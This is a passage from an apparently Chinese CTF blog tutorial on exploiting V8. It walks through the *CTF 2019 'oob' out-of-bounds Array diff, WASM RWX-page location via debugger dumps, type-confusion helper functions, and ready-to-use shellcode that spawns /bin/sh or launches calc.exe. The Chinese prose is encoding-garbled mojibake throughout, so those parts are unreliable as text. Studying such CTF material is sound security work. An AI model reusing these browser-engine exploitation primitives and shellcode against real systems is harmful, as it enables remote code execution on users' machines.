class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f8f1</span><br><span class="line">0xd1dfcf5f8f1: [SharedFunctionInfo] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0cb6b4d409e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x0cb6b4d44ae1 &lt;String[<span class="comment">#1]: 0&gt;</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x0d1dfcf5f8c9 &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - code (from data): 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - <span class="keyword">function</span> token position: -1</span><br><span class="line"> - start position: -1</span><br><span class="line"> - end position: -1</span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: 0x0cb6b4d40c61 &lt;ScopeInfo[0]&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - feedback_metadata: 0xcb6b4d42a39: [FeedbackMetadata]</span><br><span class="line"> - map: 0x0cb6b4d41319 &lt;Map&gt;</span><br><span class="line"> - slot_count: 0</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹é‡Œå†æŸ¥çœ‹å…¶ <code>data</code> ç»“æ„ï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f8c9</span><br><span class="line">0xd1dfcf5f8c9: [WasmExportedFunctionData] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0cb6b4d45879 &lt;Map[40]&gt;</span><br><span class="line"> - wrapper_code: 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: 0x0d1dfcf5f731 &lt;Instance map = 0x1ccbe5f49789&gt;</span><br><span class="line"> - function_index: 0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>å†æŸ¥çœ‹ <code>instance</code> ç»“æ„ï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f731</span><br><span class="line">0xd1dfcf5f731: [WasmInstanceObject] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x23f8cbe0ac19 &lt;Object map = 0x1ccbe5f4abd9&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x23f8cbe10fb1 &lt;Module map = 0x1ccbe5f491e9&gt;</span><br><span class="line"> - exports_object: 0x23f8cbe111e9 &lt;Object map = 0x1ccbe5f4ad19&gt;</span><br><span class="line"> - native_context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - memory_object: 0x0d1dfcf5f859 &lt;Memory map = 0x1ccbe5f4a189&gt;</span><br><span class="line"> - table 0: 0x23f8cbe11181 &lt;Table map = 0x1ccbe5f49aa9&gt;</span><br><span class="line"> - imported_function_refs: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x23f8cbe11129 &lt;Foreign&gt;</span><br><span class="line"> - memory_start: 0x7f9440280000</span><br><span class="line"> - memory_size: 65536</span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: 0x55ab193567e0</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55ab19356800</span><br><span class="line"> - indirect_function_table_size: 0</span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ä»”ç»†æŸ¥çœ‹èƒ½å‘ç°ï¼Œ<code>instance</code> ç»“æ„å°±æ˜¯ <code>js</code> ä»£ç ä¸­çš„ <code>wasm_mod</code> å˜é‡çš„åœ°å€<br>æˆ‘ä»¬å†æ¥æŸ¥çœ‹è¿™ä¸ªç»“æ„çš„å†…å­˜å¸ƒå±€ï¼š  </p><img src="/2024/05/05/v8start/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ä»”ç»†çœ‹ï¼Œèƒ½å‘ç°ï¼Œ<code>rwx</code> æ®µçš„èµ·å§‹åœ°å€å‚¨å­˜åœ¨ <code>instance+0x88</code> çš„ä½ç½®ï¼Œä¸è¿‡è¿™ä¸ªä¸ç”¨è®°ï¼Œä¸åŒç‰ˆæœ¬ï¼Œè¿™ä¸ªåç§»å€¼å¯èƒ½ä¼šæœ‰å·®è·ï¼Œå¯ä»¥åœ¨å†™ <code>exp</code> çš„æ—¶å€™é€šè¿‡ä¸Šè¿°è°ƒè¯•çš„æ–¹å¼è¿›è¡ŒæŸ¥æ‰¾ã€‚<br>æ ¹æ® WASM çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬çš„ç›®çš„å¯ä»¥æ›´ç»†åŒ–äº†ï¼Œç°åœ¨æˆ‘ä»¬çš„ç›®çš„å˜ä¸ºäº†æŠŠ <code>shellcode</code> å†™åˆ° <code>WASM</code> çš„ä»£ç æ®µï¼Œç„¶åæ‰§è¡Œ <code>WASM</code> å‡½æ•°ï¼Œé‚£ä¹ˆå°±èƒ½æ‰§è¡Œ <code>shellcode</code> äº†ã€‚<br>è¿™é‡Œå¯ä»¥å†™æˆä¸€ä¸ªå›ºå®šçš„æ¨¡æ¿ï¼š   </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>arbitrary_address_read</code> å‡½æ•°çš„å…·ä½“å®ç°æ–¹å¼è¦çœ‹å…·ä½“çš„æ¼æ´ç¯å¢ƒ  </p><h2 id="å¸¸ç”¨shellcode"><a href="#å¸¸ç”¨shellcode" class="headerlink" title="å¸¸ç”¨shellcode"></a>å¸¸ç”¨shellcode</h2><p>åœ¨ <code>CTF</code> é¢˜ç›®ä¸­ï¼Œæˆ‘ä»¬çš„ç›®çš„å¤§å¤šæ•°æ˜¯ <code>getshell</code> ç„¶åè·å– <code>flag</code>ï¼Œç”¨äº <code>getshell</code> çš„ <code>shellcode</code> å¦‚ä¸‹ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¤å…¶å¼¹è®¡ç®—å™¨ï¼Œ<code>shellcode</code> å¦‚ä¸‹ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0xc0e8f0e48348fcn</span>,</span><br><span class="line">    <span class="number">0x5152504151410000n</span>,</span><br><span class="line">    <span class="number">0x528b4865d2314856n</span>,</span><br><span class="line">    <span class="number">0x528b4818528b4860n</span>,</span><br><span class="line">    <span class="number">0xb70f4850728b4820n</span>,</span><br><span class="line">    <span class="number">0xc03148c9314d4a4an</span>,</span><br><span class="line">    <span class="number">0x41202c027c613cacn</span>,</span><br><span class="line">    <span class="number">0xede2c101410dc9c1n</span>,</span><br><span class="line">    <span class="number">0x8b20528b48514152n</span>,</span><br><span class="line">    <span class="number">0x88808bd001483c42n</span>,</span><br><span class="line">    <span class="number">0x6774c08548000000n</span>,</span><br><span class="line">    <span class="number">0x4418488b50d00148n</span>,</span><br><span class="line">    <span class="number">0x56e3d0014920408bn</span>,</span><br><span class="line">    <span class="number">0x4888348b41c9ff48n</span>,</span><br><span class="line">    <span class="number">0xc03148c9314dd601n</span>,</span><br><span class="line">    <span class="number">0xc101410dc9c141acn</span>,</span><br><span class="line">    <span class="number">0x244c034cf175e038n</span>,</span><br><span class="line">    <span class="number">0x4458d875d1394508n</span>,</span><br><span class="line">    <span class="number">0x4166d0014924408bn</span>,</span><br><span class="line">    <span class="number">0x491c408b44480c8bn</span>,</span><br><span class="line">    <span class="number">0x14888048b41d001n</span>,</span><br><span class="line">    <span class="number">0x5a595e58415841d0n</span>,</span><br><span class="line">    <span class="number">0x83485a4159415841n</span>,</span><br><span class="line">    <span class="number">0x4158e0ff524120ecn</span>,</span><br><span class="line">    <span class="number">0xff57e9128b485a59n</span>,</span><br><span class="line">    <span class="number">0x1ba485dffffn</span>,</span><br><span class="line">    <span class="number">0x8d8d480000000000n</span>,</span><br><span class="line">    <span class="number">0x8b31ba4100000101n</span>,</span><br><span class="line">    <span class="number">0xa2b5f0bbd5ff876fn</span>,</span><br><span class="line">    <span class="number">0xff9dbd95a6ba4156n</span>,</span><br><span class="line">    <span class="number">0x7c063c28c48348d5n</span>,</span><br><span class="line">    <span class="number">0x47bb0575e0fb800an</span>,</span><br><span class="line">    <span class="number">0x894159006a6f7213n</span>,</span><br><span class="line">    <span class="number">0x2e636c6163d5ffdan</span>,</span><br><span class="line">    <span class="number">0x657865n</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h2 id="ç±»å‹æ··æ·†åˆ©ç”¨æ¨¡æ¿"><a href="#ç±»å‹æ··æ·†åˆ©ç”¨æ¨¡æ¿" class="headerlink" title="ç±»å‹æ··æ·†åˆ©ç”¨æ¨¡æ¿"></a>ç±»å‹æ··æ·†åˆ©ç”¨æ¨¡æ¿</h2><p>è¿™é‡Œå…ˆç»™å‡ºä¸€äº›æ–¹ä¾¿ç±»å‹æ··æ·†æ¼æ´åˆ©ç”¨çš„æ¨¡æ¿ï¼Œåœ¨åé¢ç¼–å†™ <code>exp</code> æ—¶ä¼šç”¨ä¸Š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ¼æ´åˆ©ç”¨å®æˆ˜"><a href="#æ¼æ´åˆ©ç”¨å®æˆ˜" class="headerlink" title="æ¼æ´åˆ©ç”¨å®æˆ˜"></a>æ¼æ´åˆ©ç”¨å®æˆ˜</h1><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å’Œæ–‡ç« ä¸€å¼€å§‹è¯´çš„ä¸€æ ·ï¼Œç¯å¢ƒç”¨çš„æ˜¯ <code>*CTF 2019</code> çš„ <code>oob</code>ã€‚é¢˜ç›®ç»™äº†ä¸€ä¸ª <code>diff</code> æ–‡ä»¶ï¼š  </p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><p>å—¯ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ï¼Œå¥½åƒçœ‹çš„ä¸å¤ªæ‡‚ï¼Œè¿™é‡Œç®€å•è§£é‡Šä¸€ä¸‹<br>è¿™é‡Œä¸»è¦æ˜¯å‡ºé¢˜äººä¸º <code>array</code> å®šä¹‰äº†ä¸€ä¸ª <code>oob</code> å‡½æ•°ï¼Œå…¶å‡½æ•°çš„åŠŸèƒ½å¦‚ä¸‹ï¼š  </p><ul><li>è·å–å‚æ•°çš„æ•°é‡ï¼Œç„¶åæ ¹æ®å‚æ•°ä¸ªæ•°è¿›è¡Œä¸åŒçš„æ“ä½œ  </li><li>å¦‚æœå‚æ•°æ•°é‡å¤§äº <code>2</code> åˆ™ç›´æ¥æŠ›å‡º <code>undefined</code>  </li><li>å¦‚æœå‚æ•°æ•°é‡å°äºç­‰äº <code>2</code>ï¼Œåˆ™å…ˆæŠŠ <code>array</code> è½¬æˆ <code>doublearray</code>  </li><li>ç„¶ååˆ¤æ–­å¦‚æœæ— é¢å¤–å‚æ•°ï¼ˆç¬¬ä¸€ä¸ªæ˜¯ <code>this</code>ï¼‰ï¼Œåˆ™æ˜¯ <code>read</code> åŠŸèƒ½ï¼Œè¿”å› <code>array[length]</code>  </li><li>å¦‚æœä¼ å…¥äº†ä¸€ä¸ªå‚æ•°ï¼Œåˆ™æ˜¯ <code>write</code> åŠŸèƒ½ï¼Œå°† <code>value</code> å†™å…¥åˆ° <code>doublearray[length]</code> ä¸­</li></ul><p>è¿™é‡Œçš„æ¼æ´è¿˜æ˜¯æŒºå¥½å‘ç°äº†ï¼Œæˆ‘ä»¬çŸ¥é“ <code>array</code> æœ€åä¸€ä¸ªå…ƒç´ çš„ç´¢å¼•ä¸º <code>length - 1</code>ï¼Œ è€Œè¿™é‡Œå¯ä»¥ç´¢å¼•åˆ° <code>length</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åœ¨ <code>elements</code> ä¸­è¶Šç•Œè¯»å’Œå†™ä¸€ä¸ªç´¢å¼•çš„æ•°æ®<br>åœ¨ä¸Šé¢çš„åˆ†æä¸­æˆ‘ä»¬çŸ¥é“ <code>elements</code> æ˜¯åœ¨ <code>obj</code> çš„ä¸Šæ–¹çš„ï¼Œå½“æ—¶æˆ‘ä¹Ÿè¯´è¿‡ <code>elements</code> å¹¶ä¸ä¸€å®šç´§è´´ç€ <code>obj</code> çš„ï¼Œç°åœ¨æˆ‘å°±æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªé—®é¢˜ã€‚<code>demo</code> ä»£ç å¦‚ä¸‹ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x20bd84310ab9 &lt;JSArray[4]&gt;  </span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x20bd84310ab9</span><br><span class="line">0x20bd84310ab9: [JSArray]</span><br><span class="line"> - map: 0x273506142d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02e1c7e51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20bd84310a41 &lt;FixedArray[4]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x10c0b3540c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x15d18a8001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20bd84310a41 &lt;FixedArray[4]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 4</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tel 0x20bd84310a41</span><br><span class="line">00:0000â”‚  0x20bd84310a41 â—‚â€” 0x10c0b35408</span><br><span class="line">01:0008â”‚  0x20bd84310a49 â—‚â€” 0x4000000</span><br><span 